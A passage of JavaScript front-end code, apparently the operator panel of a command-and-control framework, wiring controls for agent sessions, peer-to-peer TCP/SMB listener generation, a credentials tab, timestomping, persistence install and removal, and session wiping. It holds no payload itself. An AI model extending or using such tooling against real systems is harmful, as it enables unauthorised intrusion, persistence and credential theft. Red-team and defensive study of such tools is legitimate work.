        if (!_activeId) return;
        const s = _sessions[_activeId];
        if (!s) return;
        pollBtn.disabled = true;
        try {
          if (s.polling_stopped) {
            await API.resumePolling(_activeId);
          } else {
            await API.stopPolling(_activeId);
          }
        } catch (e) {
          Toast.error('Poll toggle failed', String(e));
        } finally {
          pollBtn.disabled = false;
        }
      });
    }

    const lockBtn = $('#btn-lock-toggle');
    if (lockBtn) {
      lockBtn.addEventListener('click', async () => {
        if (!_activeId) return;
        lockBtn.disabled = true;
        try {
          await API.toggleLock(_activeId);
        } catch (e) {
          Toast.error('Lock toggle failed', e.message || String(e));
        } finally {
          lockBtn.disabled = false;
        }
      });
    }

    const genBtn = $('#btn-gen-listener');
    if (genBtn) {
      genBtn.addEventListener('click', () => {
        if (!_activeId) return;
        const s = _sessions[_activeId];
        if (!s) return;

        const osHint = (s.target_os || '').toLowerCase();
        const plat = $('#p2p-f-platform');
        if (plat) plat.value = osHint.includes('windows') ? 'windows' : 'linux';

        const bt = $('#p2p-f-bind-type');
        const ifaceEl = $('#p2p-f-iface');
        const portEl = $('#p2p-f-port');
        const pipeEl = $('#p2p-f-pipe');
        const lblIface = $('#p2p-lbl-iface');
        const lblPort = $('#p2p-lbl-port');
        const lblPipe = $('#p2p-lbl-pipe');
        if (bt) {
          bt.value = 'tcp';
          bt.onchange = () => {
            const isSMB = bt.value === 'smb';
            if (ifaceEl) ifaceEl.style.display = isSMB ? 'none' : '';
            if (lblIface) lblIface.style.display = isSMB ? 'none' : '';
            if (portEl) portEl.style.display = isSMB ? 'none' : '';
            if (lblPort) lblPort.style.display = isSMB ? 'none' : '';
            if (pipeEl) pipeEl.style.display = isSMB ? '' : 'none';
            if (lblPipe) lblPipe.style.display = isSMB ? '' : 'none';
          };
          bt.onchange();
        }
        if (ifaceEl) ifaceEl.value = '0.0.0.0';
        if (portEl) portEl.value = '';
        if (pipeEl) pipeEl.value = '';
        const labelEl = $('#p2p-f-label');
        if (labelEl) labelEl.value = '';

        const goBtn = $('#p2p-gen-go');
        if (goBtn) {
          const newGo = goBtn.cloneNode(true);
          goBtn.replaceWith(newGo);
          newGo.addEventListener('click', async () => {
            newGo.disabled = true;
            try {
              const iface = ifaceEl?.value?.trim() || '0.0.0.0';
              const port = parseInt(portEl?.value || '0', 10) || 0;
              const bindAddr = bt?.value === 'smb' ? '' : (port ? `${iface}:${port}` : '');
              const gl = await API.generateListener({
                donor_session_id: _activeId,
                bind_type: bt?.value || 'tcp',
                platform: plat?.value || 'linux',
                port: port,
                pipe: pipeEl?.value || '',
                bind_address: bindAddr,
                label: labelEl?.value || '',
              });
              Modal.close('p2p-gen-modal');
              if (gl?.ok) {
                Toast.info('P2P Listener', `Building ${gl.platform} ${gl.bind_type} listener — session ${gl.session_id}`);
              } else {
                Toast.error('P2P Listener', gl?.error || gl?.detail || 'generate-listener failed');
              }
            } catch (e) {
              Toast.error('P2P Listener', e.message || String(e));
            } finally {
              newGo.disabled = false;
            }
          });
        }
        Modal.open('p2p-gen-modal');
      });
    }

    const listenBadge = $('#listen-badge');
    if (listenBadge) {
      listenBadge.addEventListener('click', _listenBadgeToggleExpand);
    }

    // Credentials tab
    _initColResize('creds-tbl', 'colw:creds-tbl');
    $('#btn-cred-add')?.addEventListener('click', () => { if (_activeId) _openCredModal(); });
    $('#cred-save')?.addEventListener('click', _saveCred);

    _startHbTicker();
  }

  function getActiveId()   { return _activeId; }
  function getSession(id)  { return _sessions[id || _activeId]; }

  function markWiping(id) {
    if (_sessions[id]) {
      _sessions[id]._wiping = true;
      renderList();
    }
  }

  function setLocked(id, locked) {
    if (_sessions[id]) {
      _sessions[id].locked = locked;
      renderList();
      if (id === _activeId) _renderDetail();
    }
  }

  function redraw() { renderList(); if (_activeId) _renderDetail(); }

  return {
    init, select, upsert, remove, setAll, renderList, redraw, markWiping, setLocked,
    onOutput, onRemoteCommand, onArtifactsChanged, onCredentialsChanged, onHeartbeat, getActiveId, getSession,
    doSysinfo, doTimestomp, doKillAgent,
    doSleep, doJitter, stepSleep, stepJitter,
    doPersist, doPersistProbe, doPersistProbeAll, doPersistProbeSelected,
    doPersistInstall, doPersistInstallSelected,
    doPersistRemove, doPersistRemoveSelected, doPersistStatus,
    togglePersistSelect, togglePersistSelectAll,
    doKillSession, doWipeSession,
  };
})();
